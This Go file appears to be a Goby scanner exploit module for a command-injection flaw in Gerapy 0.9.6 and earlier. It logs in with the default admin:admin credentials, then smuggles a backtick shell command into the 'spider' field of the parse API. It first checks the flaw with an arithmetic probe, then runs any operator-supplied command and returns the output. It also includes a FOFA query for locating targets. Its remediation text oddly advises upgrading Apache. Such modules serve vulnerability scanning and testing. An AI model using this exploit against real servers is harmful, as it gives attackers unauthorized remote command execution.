package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Gerapy 0.9.6 parse RCE",
    "Description": "<p>Gerapy is a distributed crawler management framework based on Scrapy, Scrapyd, Django and Vue.js.</p><p>There is a command execution vulnerability in Gerapy 0.9.6 and earlier versions (default password admin:admin), and attackers can use the vulnerability to gain server permissions.</p>",
    "Impact": "Gerapy 0.9.6 parse RCE",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/Gerapy/Gerapy/releases\">https://github.com/Gerapy/Gerapy/releases</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
    "Product": "Gerapy",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Gerapy 管理框架 0.9.6 版本 parse 参数命令执行漏洞",
            "Description": "<p>Gerapy是一款基于Scrapy、Scrapyd、Django和Vue.js的分布式爬虫管理框架。</p><p>Gerapy 0.9.6和之前的版本中存在命令执行漏洞（默认密码admin:admin），攻击者可利用漏洞获取服务器权限。</p>",
            "Impact": "<p>Gerapy 0.9.6和之前的版本中存在命令执行漏洞（默认密码admin:admin），攻击者可利用漏洞获取服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://github.com/Gerapy/Gerapy/releases\">https://github.com/Gerapy/Gerapy/releases</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、升级Apache系统版本。</p>",
            "Product": "Gerapy",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Gerapy 0.9.6 parse RCE",
            "Description": "<p>Gerapy is a distributed crawler management framework based on Scrapy, Scrapyd, Django and Vue.js.</p><p>There is a command execution vulnerability in Gerapy 0.9.6 and earlier versions (default password admin:admin), and attackers can use the vulnerability to gain server permissions.</p>",
            "Impact": "Gerapy 0.9.6 parse RCE",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/Gerapy/Gerapy/releases\">https://github.com/Gerapy/Gerapy/releases</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
            "Product": "Gerapy",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"Gerapy\"",
    "GobyQuery": "body=\"Gerapy\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/Gerapy/Gerapy",
    "DisclosureDate": "2021-11-28",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.2",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Gerapy"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10239"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			Rand1 := 10000 + rand.Intn(100)
			Rand2 := 5000 + rand.Intn(100)
			uri1 := "/api/user/auth"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/json;charset=UTF-8")
			cfg1.Data = `{"username":"admin","password":"admin"}`
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "token") {
					tokenFind := regexp.MustCompile("\"token\":\"(.*?)\"").FindStringSubmatch(resp1.RawBody)
					uri2 := "/api/project/1/parse"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("Content-Type", "application/json;charset=UTF-8")
					cfg2.Header.Store("Authorization", "Token "+tokenFind[1])
					cfg2.Data = fmt.Sprintf("{\"spider\":\";`expr %d + %d`\"}", Rand1, Rand2)
					ss.VulURL = u.Scheme() + "://admin:admin@" + u.IP + ":" + u.Port + "/api/user/auth"
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil && resp2.StatusCode == 200 {
						return strings.Contains(resp2.RawBody, strconv.Itoa(Rand1+Rand2))
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri1 := "/api/user/auth"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/json;charset=UTF-8")
			cfg1.Data = `{"username":"admin","password":"admin"}`
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "token") {
					tokenFind := regexp.MustCompile("\"token\":\"(.*?)\"").FindStringSubmatch(resp1.RawBody)
					uri2 := "/api/project/1/parse"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("Content-Type", "application/json;charset=UTF-8")
					cfg2.Header.Store("Authorization", "Token "+tokenFind[1])
					cfg2.Data = fmt.Sprintf("{\"spider\":\";`%s`\"}", cmd)
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
						expResult.Output = resp2.RawBody
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
